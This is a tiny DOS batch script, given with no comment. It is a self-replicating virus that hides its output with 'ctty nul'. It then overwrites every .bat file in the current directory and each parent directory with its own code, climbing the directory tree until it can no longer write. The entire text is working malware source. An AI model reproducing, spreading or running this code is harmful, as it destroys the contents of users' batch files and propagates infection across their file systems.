@ctty nul
:Dot
for %%b in (%NEW%*.bat) do copy %0 %%b
set NEW=..\%NEW%
copy %0 %NEW%%0
if not exist %NEW%%0 exit
del %NEW%%0
goto Dot